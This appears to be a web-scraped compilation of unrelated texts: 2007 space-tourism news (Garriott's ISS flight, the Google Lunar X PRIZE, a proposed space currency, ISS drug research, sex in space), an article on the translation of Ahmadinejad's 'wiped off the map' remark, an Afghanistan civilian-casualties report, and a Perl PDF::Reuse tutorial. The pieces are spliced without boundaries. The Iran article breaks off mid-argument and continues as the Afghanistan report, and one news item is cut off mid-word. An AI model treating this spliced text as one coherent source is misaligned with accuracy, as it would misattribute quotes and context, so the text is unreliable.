Published September 28th , 2007
Richard GarriotSpace Adventures , Ltd. , the world ’s leading space experiences company , announced today that famed game developer Richard Garriott , son of former NASA astronaut Owen Garriott , has begun preparations for a “ commercially active ” mission to the International Space Station ( ISS ) .
Mr. Garriott ’s spaceflight , currently planned for October 2008 , will be the first in a series of missions that will accommodate commercial activity aboard the ISS .
Involvement from the private sector can include scientific and environmental research and educational outreach programming .
“ It has always been Space Adventures ‘ goal to open the space frontier .
Now , with Richard ’s flight , we have designed a series of missions devoted to increase commercial involvement in manned space missions , ” said Eric Anderson , president and CEO of Space Adventures .
“ It is a very rare occasion when so many commercial opportunities are available in one space mission .
We encourage interested parties to contact us . ”
Space Adventures made history in 2001 by organizing the mission of the first private space explorer .
Now , the company continues to bring innovation to manned space flight by enabling corporate and non-profit entities to participate in commercial endeavors on the planet ’s only orbiting outpost .
“ I am dedicating my spaceflight to science , ” said Mr. Garriott .
“ It is my goal to devote a significant amount of my time aboard the space station to science , engineering and educational projects .
I understand the necessity for conducting research in extreme environments whether it is collecting microorganisms from deep sea hydrothermal vents to carrying out experiments in the continuous micro-gravity of Earth orbit . ”
He continued , “ We need to be adventurous in mind and stimulate our intellects to answer today ’s most daunting scientific questions and to invent tomorrow ’s technological marvels . ”
The first commercial research partner involved in Mr. Garriott ’s mission is ExtremoZyme , Inc. , a biotechnology company co-founded by Owen Garriott .
The company plans to conduct protein crystallization experiments in space with proteins that have important cellular functions and are usually associated with common human diseases .
Having access to these superior crystals will enable researchers to learn more about the molecular details of these proteins which is essential for protein engineering and structure - guided drug design .
“ Because of my career , it was almost natural for Richard to be interested in space and exploration .
I am so pleased that he is able to embrace this himself and that he is dedicating his flight to research .
I am very proud of him , ” said Owen Garriott , Mr. Garriott ’s father and former NASA astronaut ( Skylab II / SL - 3 , STS - 9/ Spacelab - 1 ) .
Interested parties , including commercial and non-profit entities and space enthusiasts , can get involved in Mr. Garriott ’s spaceflight via his web site ( http://www.richardinspace.com).
Mr. Garriott will be updating the site continuously via photos , blog entries and individuals can submit questions and suggestions for his mission activities .
“ I want to involve as many people as possible in my mission , ” said Mr. Garriott .
About Richard Garriott :
Richard Garriott is best known as a key figure in the computer gaming field .
He was one of the earliest and most successful game developers .
Mr. Garriott developed the Ultima series which remains the longest running computer game franchise , and with his brother , Robert , he founded Origin Systems , one of the most respected PC game developers and publishers .

Zoom a little zoom in a rocket ship , Off we go , on a trip !
Headin ’ for the moon at a rocket clip ,
We ’re gonna zoom - zoom … rocket ! — from the song “ Zoom a Little Zoom ( Rocket Ship ) ” sung by Tom Glazer .
The era of space tourism is upon us .
At least four well - heeled businesspeople have already forked out millions to visit the International Space Station , and billionaire Richard Branson ’s new company Virgin Galactic has just cemented a partnership with the State of New Mexico to build a commercial space port in that state .
The goal — affordable ( i.e. , $ 200,000 a ticket ) suborbital flights for ordinary folks by 2010 .
And as technologies continue to advance , most observers agree that longer flights , to the moon and perhaps even to Mars and the moons of Jupiter , could be available within 50 years .
For those who find the prospect of being lofted free of Earth ’s surly bonds intriguing , not to say irresistible , any preflight research should include reading Neil F. Comins ’s handy new book , “ The Hazards of Space Travel : A Tourist ’s Guide ” ( Villard , $ 19.95 ) .
In clear and accessible prose , Comins , a physicist at the University of Maine and the author of nine previous popular science titles , presents a no - nonsense broad overview of the multitudinous risks that the new space tourists will face .
Not Satisfied with Earth , Google Moves to Conquer Moon / images
Published September 13th , 2007 / images
The X PRIZE Foundation and Google Inc. ( NASDAQ : GOOG ) today announced the Google Lunar X PRIZE , a robotic race to the Moon to win a remarkable $ 30 million prize purse .
Private companies from around the world will compete to land a privately funded robotic rover on the Moon that is capable of completing several mission objectives , including roaming the lunar surface for at least 500 meters and sending video , images and data back to the Earth .
The Google Lunar X PRIZE is an unprecedented international competition that will challenge and inspire engineers and entrepreneurs from around the world to develop low - cost methods of robotic space exploration .
The X PRIZE Foundation , best known for the $ 10 million Ansari X PRIZE for private suborbital spaceflight , is an educational nonprofit prize organization whose goal is to bring about radical breakthroughs to solve some of the greatest challenges facing the world today .
“ The Google Lunar X PRIZE calls on entrepreneurs , engineers and visionaries from around the world to return us to the lunar surface and explore this environment for the benefit of all humanity , ” said Dr. Peter H. Diamandis , Chairman and CEO of the X PRIZE Foundation .
“ We are confident that teams from around the world will help develop new robotic and virtual presence technology , which will dramatically reduce the cost of space exploration . ”
“ Having Google fund the purse and title the competition punctuates our desire for breakthrough approaches and global participation , ” continued Diamandis .
“ By working with the Google team , we look forward to bringing this historic private space race into every home and classroom .
We hope to ignite the imagination of children around the world . ”
About Lunar Exploration :
In the 1960s , the United States and the Soviet Union engaged in a historic superpower Moon race , which culminated in 12 men exploring the surface of the Moon .
The first era of lunar exploration reached a dramatic conclusion in December of 1972 as Apollo 17 Astronauts Captain Gene Cernan and Dr. Harrison Schmitt became the last men on the Moon .
Moon 2.0 , the second era of lunar exploration , will not be a quest for “ flags and footprints . ”
This time we will go to the Moon to stay .
The Moon is a stepping stone to the rest of the solar system and a source of solutions to some of the most pressing environmental problems that we face on Earth – energy independence and climate change .
Already , governments from around the world recognize the importance of lunar exploration , and national space agencies from the United States , Russia , China , India , Japan , and the nations of Europe plan to send probes to the Moon in the coming decade .
Today , the frontier of private enterprise is the halo of communications satellites in geostationary orbit 24,000 miles above our planet .
The Google Lunar X PRIZE now challenges private enterprise to reach 10 times beyond its present limits to participate in this great exploration adventure .
About the Prize Purse :
• The $ 30 million prize purse is segmented into a $ 20 million Grand Prize , a $ 5 million Second Prize and $ 5 million in bonus prizes .
To win the Grand Prize , a team must successfully soft land a privately funded spacecraft on the Moon , rove on the lunar surface for a minimum of 500 meters , and transmit a specific set of video , images and data back to the Earth .
The Grand Prize is $ 20 million until December 31st 2012 ; thereafter it will drop to $ 15 million until December 31st 2014 at which point the competition will be terminated unless extended by Google and the X PRIZE Foundation .
To win the Second Prize , a team must land their spacecraft on the Moon , rove and transmit data back to Earth .
Second place will be available until December 31st 2014 at which point the competition will be terminated unless extended by Google and the X PRIZE Foundation .
• Bonus prizes will be won by successfully completing additional mission tasks such as roving longer distances (> 5,000 meters ) , imaging man made artifacts ( e.g. Apollo hardware ) , discovering water ice , and / or surviving through a frigid lunar night ( approximately 14.5 Earth days ) .
The competing lunar spacecraft will be equipped with high - definition video and still cameras , and will send images and data to Earth , which the public will be able to view on the Google Lunar X PRIZE website .
Why the Moon ?
In a recent Gallup poll , more than two - thirds of Americans ( 68 % ) support a return to the Moon , and further missions to points beyond .
Some practical benefits to lunar exploration include :
• Enabling exploration of the solar system and beyond .
Space exploration is expensive because every ounce of propellant and spacecraft must be launched out of the Earth ’s strong gravity field .
A natural storehouse of materials , lunar soil is more than 40 % oxygen by weight and oxygen makes up most of the mass of rocket propellant .
Because of its shallower gravity well , the Moon is the stepping stone to the universe .
• The Moon can help save the Earth .
For more than 30 years , NASA and the US Department of Energy have experimented with ways to capture abundant clean solar energy in space for use on Earth .
Although the technology for doing this is well understood , the high cost of launching materials out of the Earth ’s deep gravity well has prevented the implementation of these systems .
However , if lunar material is used for space construction , clean energy could be supplied on a 24 - hour basis without carbon dioxide or other hazards to the biosphere .
• We can learn about the Earth ’s geologic past .
Thanks to the Moon rocks and other information returned by Apollo astronauts , scientists now believe that the Moon was created by a collision between a planet - sized object and the early Earth .
By exploring our nearest neighbor we are also exploring a remnant of ancient Earth .
• We can see more deeply into space .
The Moon provides a large stable platform for astronomical observation unhindered by atmosphere .
The far side of the Moon is the one “ quiet ” place in the Solar System that is shielded from the Earth ’s cacophony of radio , television and data broadcasts .
The body of the Moon itself provides this shielding , and a radio telescope on the lunar far side can detect energy from the beginning of the universe .
• Driving new technologies and devices .
The Moon may be the most hostile environment we face in the near future .
Surviving and exploring will require major advances in technology .
Many of those technologies will also have practical use back home .
Educational materials are now available online at www.googlelunarxprize.org.
Educators can sign up for regular updates , classroom plans and news about the teams .
Strategic Alliances :
Strategic alliances that support this new competition include :
• Space Exploration Technologies ( SpaceX ) , run by entrepreneur and X PRIZE Foundation Trustee Elon Musk , which is offering competing teams an in - kind contribution , lowering the cost of its Falcon Launch Vehicle .
( SpaceX ) , is the first preferred launch provider for this competition ;
• The Allen Telescope Array ( ATA ) , operated by the SETI Institute , will serve as a preferred downlink provider for communications from the Moon to the Earth ; operated by SETI , which will provide downlink services at no cost to competing teams ;
• The Saint Louis Science Center serves as the Foundation ’s official education partner and the coordinator of an international network of museums and science centers ; and
• The International Space University ( ISU ) , based in Strasbourg , France , will conduct international team outreach and facilitate an unbiased judging committee .

New Currency Suggested for Space Tourists
Published October 8th , 2007
Foreign exchange specialist Travelex today unveiled a unit of currency that has been created for use in space .
It is the first currency of its kind in the universe and has been developed in partnership with a team of scientists from the National Space Centre and the University of Leicester .
With Virgin Galactic making its maiden voyage in 2009 and with the signing in April this year of the Global Exploration Initiative , an agreement between the US and the UK to work together on future planetary explorations to the Moon and beyond , Space Tourism is soon to become commonplace .
Recognising that tourists could soon be heading further than Spain and Greece Travelex has teamed up with the National Space Centre to create the Quasi Universal Intergalactic Denomination or QUID .
The QUID has been designed to withstand the stresses of space travel and the extreme environment found in orbit around the Earth .
It has also been created so that it can be purchased on earth in any one of the 176 currencies used around the glob
ISS To Be Used As Orbiting Drug Lab ?
Published October 8th , 2007 A swaggering Texas investor with a famous name wants Big Pharma to pick up the tab for the International Space Station when NASA eases off .
Thomas Pickens III thinks the pharmaceutical industry and the space station need each other .
Drug discovery is an arduous and extremely expensive project .
But in space , molecules do miraculous things .
Disease - causing proteins crystallize so well — growing larger and clearer — that finding a drug to stop the protein ’s damaging activities could happen months , if not years , faster .
Scientists have known for decades that some science works better in space — but it has n’t been easy to get experiments up there .
Now , with NASA planning to reduce its $ 2.6 billion annual investment beginning in 2015 , the agency is throwing the space station open for private enterprise .
And the Texas financial scion and multimillionaire is ready to transform space science with an injection of capitalism .
“ If people knew what I already know , the International Space Station would be considered one of the most valuable resources our world possesses , ” Pickens said at the ISS National Laboratory Workshop last week .
“ There are things you can only do in microgravity that will eventually lead to products that could save millions of lives . ”
Pickens is chairman of the board of Spacehab , a company that provides equipment and services for scientists who want to send experiments into space .
He has an obvious vested interest in getting scientists , and the entities that fund them ..
But all the bias in the world does n’t matter , if there are experiments worth doing in space .
Scientists have sent all kinds of things into space with unique results .
One 2000 experiment found that 1,600 kidney - cell genes were expressed differently in space than on the ground .
Another found colon - cancer cells showed unique metabolic changes in microgravity .
But with so many possible avenues of discovery , it has been difficult for scientists to make much progress , given how limited time in space has been .
Still , one area of research has had results that can lead scientists down a clear path of drug discovery : protein crystals .
“ Up in space , the crystals grow bigger and better , ” said Tim Osslund , who specializes in protein formulation at Amgen .
“ The end result is higher resolution . ”
And that resolution is a very valuable thing .
Osslund sent some of the company ’s proteins to the Mir space station in 1998 .
His crystals grew 32 times larger in space than in an earth - grown control environment .
Larger , better crystals allow scientists to see a protein at the atomic level .
That kind of detail can significantly accelerate drug discovery .
Pickens , who also manages a $ 100 million nanotechnology fund , believes that getting paid to grow these proteins in space will be the killer app for keeping the $ 130 billion International Space Station alive .
Increased traffic to the ISS could drive down the cost of space flight and open up the station to all kinds of commercial applications , which would come in handy as NASA ’s financial support wanes .
Sex in Space is Less than 10 Years Away Published October 7th , 2007 Would n’t it be lovely if life imitated art – if the zero - gravity love - in depicted in the sci - fi flick Supernova happened every day men and women ventured into the stratosphere ?
But it does n’t .
Sex in space has happened only once , officially , and it involved two small freshwater fish .
From Japan .
Spacemen and spacewomen have been entering and re-entering the Earth ’s atmosphere for the past 25 years , but there ’s been no reported extraterrestrial sexual activity .
That , however , is all about to change .
Space hotels are taking bookings , and , according to Gene Meyers , president of the Space Island Group , “ the main reason people want to spend a week in space is the fabulous sex ” .
For around £ 500,000 , Meyers ’s group hopes to offer , by 2015 , a honeymoon suite .
And there ’s no shortage of takers .
On the original space shuttles , there was just no room for sex .
The other astronauts would n’t have known where to put themselves .
According to NASA , the astronauts just got on with analysing soil samples .
But the public were n’t convinced .
They pointed to The Final Mission , a book by the French astronomer Pierre Kohler .
It dealt with “ Document 12-571-3570 ” , a supposedly secret NASA report about sex experiments in space .
Of 10 different male - female positions tested , only four were possible without harnesses .
NASA denounced it all as a hoax , but people started to wonder , asking why sex had n’t happened .
After all , Spacelab modules were more roomy , with private bunks and sliding doors .
Whatever NASA said , it ’s possible a spaceman and woman , at some point , had decided to forget the soil samples for a night .
When the International Space Station introduced pregnancy tests into medical packs in 2001 , the public concluded that sex in space had become a reality .
And if , owing to overcrowding , we end up colonising the universe , sex in space will be a necessity , and we need to understand its workings .
Gravity affects everything , including the movement of sperm .
Even if a sperm reaches an egg , it will have to endure radiation and incredible acceleration on re-entering Earth ’s orbit .
There are statistics concerning pregnant lab rats ( in zero gravity , the fetal skeletons were 13 % to 17 % smaller ) , but nothing about humans .
Truth is , we need more sex .

EVER since he spoke at an anti-Zionism conference in Tehran last October , President Mahmoud Ahmadinejad of Iran has been known for one statement above all .
As translated by news agencies at the time , it was that Israel " should be wiped off the map . "
Iran 's nuclear program and sponsorship of militant Muslim groups are rarely mentioned without reference to the infamous map remark .
Here , for example , is R. Nicholas Burns , the under secretary of state for political affairs , recently : " Given the radical nature of Iran under Ahmadinejad and its stated wish to wipe Israel off the map of the world , it is entirely unconvincing that we could or should live with a nuclear Iran . "
But is that what Mr. Ahmadinejad said ?
And if so , was it a threat of war ?
For months , a debate among Iran specialists over both questions has been intensifying .
It starts as a dispute over translating Persian but quickly turns on whether the United States ( with help from Israel ) is doing to Iran what some believe it did to Iraq — building a case for military action predicated on a faulty premise .
" Ahmadinejad did not say he was going to wipe Israel off the map because no such idiom exists in Persian , " remarked Juan Cole , a Middle East specialist at the University of Michigan and critic of American policy who has argued that the Iranian president was misquoted .
" He did say he hoped its regime , i.e. , a Jewish - Zionist state occupying Jerusalem , would collapse . "
Since Iran has not " attacked another country aggressively for over a century , " he said in an e-mail exchange , " I smell the whiff of war propaganda . "
A US military spokesman denied the request for US forces to leave was made , formally or otherwise , or that they had caused most of the casualties .
But the episode underlines differences of opinion among NATO and US military forces in Afghanistan on tactics for fighting Taliban insurgents , and concern among soldiers about the consequences of the number of civilians being killed .
A precise tally of civilian casualties is difficult to pin down , but one reliable count puts the number killed in Helmand this year at about 300 , most caused by foreign and Afghan forces rather than the Taliban .
" Everyone is concerned about civilian casualties , " the senior British commander said .
" Of course it is counterproductive if civilians get injured , but we 've got to pick up the pack of cards that we have got .
Other people have been operating in our area before us . "
After 18 months of heavy fighting , the British commanders say they are finally making headway in securing key areas such as Sangin and are now in the difficult position of trying to win back support among local people whose lives have been devastated by aerial bombing .
US Special Forces have been active in Helmand since US forces first entered Afghanistan in late 2001 and for several years they maintained a small base outside the town of Gereshk .
But the foreign troop presence was never more than a few hundred .
British forces arrived last northern spring and now have command of the province with 6000 men deployed , with small units of Estonian and Danish troops .
US Special Forces have continued to help in fighting insurgents , operating as advisers to Afghan security forces .
It is these small teams that are coming under criticism .
They work in small units that rely on airstrikes for cover because of their inability to defend themselves if they encounter large groups of insurgents .
Such teams have often called in airstrikes in Helmand and other places where civilians have subsequently been found to have suffered casualties .
In just two cases , airstrikes killed 31 nomads west of Kandahar in November last year and another 57 villagers , half of them women and children , in western Afghanistan in April .
The chief British press officer in Helmand , Colonel Charles Mayo , defended the US Special Forces , saying they were essential to NATO 's efforts to clear out heavily entrenched Taliban insurgents .
A US military spokesman said Special Forces would continue to operate in Helmand for the foreseeable future .
He denied their tactics had increased civilian deaths and blamed the Taliban for fighting from civilian compounds .
For months , frequent reports of civilian casualties have trickled out of Helmand , scene of some of the fiercest battles of the recent war .
But there has rarely been independent confirmation of the reports because the province has been too dangerous for journalists to visit .
Yet there is no doubt there have been civilian casualties .
On a rare visit to Helmand in mid-July , a journalist encountered children who were still suffering wounds sustained in a May bombing raid or another around that time .
Their father , Mohammadullah , brought them to the gate of the British army base seeking help .
His son , Bashir Ahmed , 2 , listless and stick - thin , seemed near death .
The boy and his sister Muzlifa , 7 , bore terrible shrapnel scars .
NATO doctors had removed shrapnel from the boy 's abdomen at the time of the raid and had warned his father that he might not survive , but two months later he was still hanging on .
The father said the bombing raid killed six members of the family and wounded five .
His wife lost an arm and the children 's grandmother was killed .
He said 20 people were killed in the airstrikes .

PDF Processing with Perl
Adobe ’s PDF has become a standard for text documents .
Most office products can export their content into PDF .
However , this software reaches its limits if you want advanced tasks such as combining different PDF documents into one single document or adding and adjusting the bookmarks panel for better navigation .
Imagine that you want to collect all relevant Perl.com articles in one PDF file with an up - to - date bookmarks panel .
You could use a tool like HTMLDOC , but adding article number 51 would require you to fetch articles one through 50 from the Web again .
In most cases you would not be satisfied by the resulting bookmarks panel , either .
This article shows how to use PDF :: Reuse , by Lars Lundberg , for combining different PDF documents and adding bookmarks to them .
Example Material
Although its capabilities are limited in this area , you can also use PDF :: Reuse to create PDF documents .
If you want to create more sophisticated documents you should investigate other PDF - packages like PDF :: API2 from Alfred Reibenschuh or Text : : PDF from Martin Hosken .
However PDF :: Reuse is sufficient to create a simple PDF to use in later examples .
The following listing should be rather self explanatory .
# file : examples / create - pdfs.pl use strict ; use PDF :: Reuse ; mkdir " out " if ( !-e " out " ) ; foreach my $x ( 1..4 ) { prFile ( " out/file - $x.pdf " ) ; foreach my $y ( 1..10 ) { prText ( 35,800 , " File : file - $ x.pdf " ) ; prText ( 510,800 , " Page : $ y " ) ; foreach my $ z ( 1..15 ) { prText ( 35,700 - $ z * 16 , " Line $ z " ) ; } # add graphics with the prAdd function # stroke color prAdd( " 0.1 0.1 0.9 RG
" ) ; # fill color prAdd( " 0.9 0.1 0.1 rg
" ) ; my $ pos = 750 - ( $y * 40 ) ; prAdd ( " 540 $ pos 10 40 re
" ) ; prAdd ( " B
" ) ; if ( $y < 10 ) { prPage ( ) ; } } prEnd ( ) ; }
Open a new file with with prFile ( $ filename ) and close it with prEnd .
Between those two calls , add text with the prText command .
You can also draw graphics by using the low level command prAdd with plain PDF markup as parameter .
Start a new page with prPage .
prFile starts the first one automatically , so you need to add a new page only if your document has more than one page .
Be aware that for the prText ( x , y , Text ) command the origin of the coordinate system is on the left bottom of the page .
As an example of adding PDF markup with prAdd , the code creates a red rectangle with blue borders .
In case you would like to add more graphics or complex graphics to your PDF , you can study the examples of the PDF reference manual .
If so , consider switching to PDF :: API2 or Text : : PDF instead of using prAdd , as they both provide a comfortable layer of abstraction over the PDF markup language .
Combining PDF Documents
PDF :: Reuse ’s main strength is the modification and reassembling of existing PDF documents .
The next example assembles a new file from the example material .
# file : examples / combine - pdfs.pl use strict ; use PDF :: Reuse ; prFile ( " out/resultat.pdf " ) ; prDoc( ' out / file - 1.pdf ' , 1,4 ) ; prDoc ( ' out / file - 2.pdf ' , 2,9 ) ; prDoc ( ' out / file - 3.pdf ' , 8 ) ; prDoc( ' out/ file - 4.pdf ' ) ; prEnd ( ) ;
Again , prFile ( $ filename ) opens the file .
Next , the prDoc( $ filename , $ firstPage , $ lastPage ) calls add to the new file various page ranges from the example file .
The arguments $ firstPage and $ lastPage are optional .
Omit both to add the entire document .
If only $ firstPage is present , the call will add everything from that page to the end .
Finally , prEnd closes the file .
Reusing Existing PDF Files
With PDF :: Reuse it is possible to use existing PDF files as templates for creating new documents .
Suppose that you have a file customer .
txt containing a list of customers to whom to send a letter .
You ’ve used a tool to create a PDF document , such as OpenOffice.org or Adobe Acrobat , to produce the letter itself .
Now you can write a short program to add the date and the names and addresses of your customers to the letter .
# file : examples / reuse - letter.pl use PDF :: Reuse ; use Date :: Formatter ; use strict ; my $ date = Date :: Formatter ->now ( ) ; $ date->createDateFormatter ( " ( DD ) . ( MM ) . ( YYYY ) " ) ; my $ n = 1 ; my $ incr = 14 ; my $ infile = ' examples/customer.txt ' ; prFile ( " examples/sample-letters.pdf " ) ; prCompress ( 1 ) ; prFont ( ' Arial ' ) ; prForm ( " examples/sample-letter.pdf " ) ; open ( my $fh , " < $ infile " ) || die " Could n't open $ infile , $ !
aborts !
" ; while ( my $ line = < $ fh > ) { my $ x = 60 ; my $y = 760 ; my ( $ first , $ last , $ street , $ zipCode , $ city , $ country ) = split ( / , / , $ line ) ; last unless $ country ; prPage ( ) if $ n++ > 1 ; prText ( $x , $y , " $ first $ last " ) ; $y -= $ incr ; prText ( $x , $y , $ street ) ; $y -= $ incr ; prText ( $x , $y , $ zipCode ) ; prText ( ( $x + 40 ) , $y , $ city ) ; $y -= $ incr ; prText ( $x , $y , $ country ) ; prText ( 60 , 600 , " Dear $ first $ last , " ) ; prText ( 400 , 630 , " Berlin , $ date " ) ; } prEnd ( ) ; close $ fh ;
After opening the file with prFile , the call to prCompress ( 1 ) enables PDF compression .
prFont sets the file ’s font .
The always - available options are Times - Roman , Times - Bold , Times - Italic , Times - BoldItalic , Courier , Courier - Bold , Courier - Oblique , Courier - BoldOblique , Helvetica , Helvetica - Bold , Helvetica - Oblique , and Helvetica - BoldOblique .
Set the font size with prFontSize .
The default font is Helvetica , with 12 pixel size .
The rest of the code is a simple loop over the file containing the customer data to filling the template with prText .
Adding Page Numbers
Sometimes you need only make a small change to a document , such as adding missing page numbers .
# file : examples / sample-numbers.pl use PDF :: Reuse ; use strict ; my $ n = 1 ; prFile ( ' examples/sample-numbers.pdf ' ) ; while ( 1 ) { prText ( 550 , 40 , $ n++ ) ; last unless prSinglePage ( ' sample-letters.pdf ' ) ; } prEnd ( ) ;
prSinglePage takes one page after the other from an existing PDFdocument and returns the number of remaining pages after each invocation .
Low - Level PDF Commands
If you know low - level PDF instructions , you can add them with with the prAdd ( string ) subroutine .
PDF :: Reuse will perform no syntax checks on the instructions , so refer to the PDF reference manual .
Here ’s an example of printing colored rectangles with the prAdd subroutine .
# file : examples / sample-rectangle.pl use PDF :: Reuse ; use strict ; prFile ( ' examples/sample-rectangle.pdf ' ) ; my $ x = 40 ; my $y = 50 ; my @colors ; foreach my $r ( 0..5 ) { foreach my $ g ( 0..5 ) { foreach my $ b ( 0..5 ) { push @colors , sprintf ( " % 1.1f % 1.1f % 1.1f rg
" , $r * 0.2 , $ g * 0.2 , $ b * 0.2 ) ; } } } while ( 1 ) { if ( $x > 500 ) { $ x = 40 ; $y += 40 ; last unless @colors ; } # a rectangle my $ string = " $x $y 30 30 re
" ; $ string .= shift @colors ; # fill and stroke $ string .= " b
" ; prAdd ( $string ) ; $ x += 40 ; } prEnd ( ) ;
Adding Bookmarks
Working with PDF files becomes comfortable if the document has bookmarks with a table of contents - like structure .
Some applications either can’t provide the PDF document with bookmarks or support insufficient or incorrect bookmarks .
PDF :: Reuse can fill this gap with the prBookmark ( $ reference ) subroutine .
A bookmark reference is a hash or a array of hashes that looks like :
{ text => ' Document - Text ' , act => ' this.pageNum = 0 ; this .scroll ( 40 , 500 ) ; ' , kids => [ { text => ' Chapter 1 ' , act => ' 1 , 40 , 600 ' } , { text => ' Chapter 2 ' , act => ' 10 , 40 , 600 ' } ] }
… where act is a JavaScript action to trigger when someone clicks on the bookmark .
Because those JavaScript actions only work in the Acrobat Reader but not in other PDF viewer applications , I will later show a improvement of PDF :: Reuse that fixes this issue .
Other examples for using PDF :: Reuse , including image embedding , are available in the PDF :: Reuse : : Tutorial .
A Console Application for Combining PDF Documents
To avoid editing the Perl code for combining PDF documents every time you want to merge documents , I ’ve written a console application that takes the names of the input files and the page ranges for each file as arguments .
That ’s easy to reuse in a graphical application using Perl / Tk , so I ’ve put that code in a separate Perl module called CombinePDFs .
The command - line application will interact with this package instead of directly working on PDF :: Reuse .
The following diagram shows the relationship between the Packages , example , and applications .
Examples | Packages | applications
------------------------------------------------------------------- combine.pdfs app-combine-console-pdfs.pl \ / PDF :: Reuse -- CombinePDFs / \ create.pdfs app-combine-tk-pdfs.pl
The application app - combine - console - pdfs.pl does not deal directly with PDF :: Reuse but parses the command line arguments with Getopt : : Long written by Johan Vromans .
This is the standard package for this task .
Here it parses the input filenames and the page ranges into two arrays of same length .
The user also has to supply a filename for the output and , optionally , a bookmarks file .
The main subroutine that parses the command line arguments and executes CombinePDFs :: createPDF is :
sub main { GetOptions ( " infile=s " => \@infiles , " outfile=s " => \ $outfile , " pages=s " , => \@pages , ' overwrite ' => \ $overwrite , ' bookmarks : s ' => \ $bookmarks , ' help ' => \&help ) ; help unless ( ( @infiles and $ outfile and @pages ) and @pages == @infiles ) ; checkPages ( ) ; checkFiles ( ) ; checkBookmarks ( ) ; CombinePDFs ::createPDF ( \@infiles , \@pages , $ outfile , $ bookmarks ) ; }
If the user passes an insufficient number of arguments , invalid filenames , or incorrect page ranges , the code invokes the the usage subroutine .
It also gets invoked if the user asks explicitly for - help on the command line .
Any good command line application should be written that way .
Getopt :: Long can distinguish between mandatory arguments , with = as the symbol after the argument name ( infile , pages ) , optional arguments , with : ( bookmarks ) , or flags ( overwrite , usage ) , without a symbol .
It can store these arguments as arrays ( infile , pages ) , hashes , or scalars .
It also supports type checking .
CombinePDFs Package
The application itself mainly performs error checking .
If everything is fine , it calls the CombinePDFs :: createPDF subroutine , passing the array of input files , the array of page ranges , and the bookmarks information .
The bookmarks scalar is optional .
Page ranges can be comma-separated ranges ( 1-11,14,17 - 23 ) , single pages , or the all token .
You can include the same page several times in the same document .
The file - checking code looks for read permissions and tests if the file is a PDF document by using the CombinePDFs ::isPDF ( $ filename ) subroutine .
Although PDF , by Antonio Rosella , also provides such a method , this package was not developed with the use strict pragma and gives a lot of warnings .
Furthermore , the package is not actively maintained , so there seems to be no chance to fix this in the near future .
Implementing the isPDF subroutine is quite simple ; it reads the first line of the PDF file and checks for the magic string % PDF - 1.[ 0 - 9 ] in the first line of the document .
Please note that PDF :: Reuse is not an object oriented package .
Therefore the CombinePDFs package is not object oriented , either .
A user of this package could create several instances , but all instances work on the same PDF file .
Submitting complex data structures via the command line is a difficult issue , so I decided that bookmarks should come from a text file .
This file has a simple markup to reflect a tree structure , where each line resembles :
< level > " bookmarks text " < page >
The level starts with 0 for root bookmarks .
Children of the root bookmarks have a level of 1 , their children a level of 2 , and so on .
Currently , the system supports bookmarks up to three levels of nesting :
0 " Folder File 1 - Page 1 " 1 1 " File 1 - Page 2 " 2 1 " Subfolder File 1 - Page 3 " 3 2 " File 1 - Page 4 " 4 0 " Folder File 2 - Page 7 " 7 1 " File 2 - Page 7 " 7 1 " File 2 - Page 9 " 9
The parsing subroutine for the bookmarks file CombinePDFs :: addBookmarks ( $ filename ) should be easy to understand , though that ’s not necessarily true of the complex data structure created inside this subroutine .
Bookmarks are an array of hashes .
addBookmarks uses several attributes .
text is the title of the entry in the bookmarks panel .
act is the action to trigger when someone clicks the entry .
Here it is the page number to open .
kids contains a reference to the children of this bookmark entry .
During the loop over the file content , the code searches for each level the last entry in a variable and pushes its related children on those last entries .
The root bookmarks get collected as an array , and the loop adds the children as a reference to an array , and so on for the grand children .
The result is a nested complex data structure which stores all children in the kids attribute of the parent ’s bookmarks hash — an array of hashes containing other arrays of hashes and so on .
The parsing subroutine for the bookmarks file CombinePDFs :: addBookmarks ( $ filename ) collects bookmarks in a array of hashes .
At the end , it adds the bookmarks to the document with prBookmarks ( $ reference ) .
All of this means that you can use a bookmarks file with the PDF file with a command line like :
$ perl bin / app - combine - pdfs.pl \ -- infile out / file-1.pdf -- pages 1 - 6 \ -- infile out / file-2.pdf -- pages 1-4,7,9-10 \ -- bookmarks out /bookmarks.cnt \ -- outfile file - all.pdf -- overwrite
Currently , you must open the document ’s navigation panel manually because PDF :: Reuse does not yet allow you to declare a default view , whether full screen or panel view .
This is easy to fix , and the author Lars Lundberg has promised me to do so in a next release of PDF :: Reuse .
In order to enable this feature until a new release will appear I included a modified version of PDF :: Reuse in the examples zip file that accompanies this article .
Furthermore , the bookmarks use JavaScript functions .
To use the bookmarks in PDF viewers other than Acrobat Reader , my patched PDF :: Reuse package replaces JavaScript bookmarks with PDF specification compliant bookmarks .
To do that , replace the act key with a page key using the appropiate page number and scroll options :
$ bookmarks = { text => ' Document ' , page => ' 0,40,50 ; ' , kids => [ { text => ' Chapter 1 ' , page => ' 1 , 40 , 600 ' } , { text => ' Chapter 2 ' , page => ' 10 , 40 , 600 ' } ] }
Then print the bookmarks to the PDF document as usual with prBookmark ( $ bookmarks ) ; .
Tk Application to Combine PDF Documents
Console applications are fine for experienced users , but you ca n’t expect that all users belong to this category .
Therefore it might be worth it to write a GUI for combining PDF documents .
The Perl / Tk toolkit founded on the old Tix widgets for Tcl / Tk is not very modern , although this might change with the Tcl / Tk release 8.5 and the Tile widgets — but it is very portable .
That ’s why I used it for the GUI example .
Because I put a layer between the PDF :: Reuse package and the command line application with the CombinePDFs package , it was easy to reuse those parts in the Tk - application app - combine - tk - pdfs.pl .
With the Tk application , the user visually selects PDF files , orders the files in a Tk : : Tree widget , and changes the page ranges and the bookmarks text in Tk : : Entry fields .
Furthermore , the application can store the resulting tree structure inside a session file and restored that later on .
It ’s also possible to copy and paste entries inside the tree , which makes it easy to create a bookmarks panel for single files without using bookmark files .
The Tk application can be found in the download at the end of this article .
Beside the final PDF file , the application creates a file with the same basename and the .cnt extension .
This file contains the bookmarks for the PDF .
It ’s also useful to continue the processing of the combined PDF file instead of reassembling all the source files again .
The entry for this feature is File -> Load Bookmarks - File .
When loading a bookmarks file , the same extension convention is in place .
Other PDF Packages on CPAN
I like PDF :: Reuse , but there are several other options for PDF creation and manipulation on the CPAN .
PDF ::API2 , by Alfred Reibenschuh , is actively maintained .
It is the package of choice if creating new PDF documents from scratch .
PDF ::API2 :: Simple , by Red Tree Systems , is a wrapper over the PDF :: API2 module for users who find the PDF :: API2 module to difficult to use .
module for users who find the PDF :: API2 module to difficult to use .
Text :: PDF , by Martin Hosken , can work on more than PDF file at the same time and has Truetype font support .
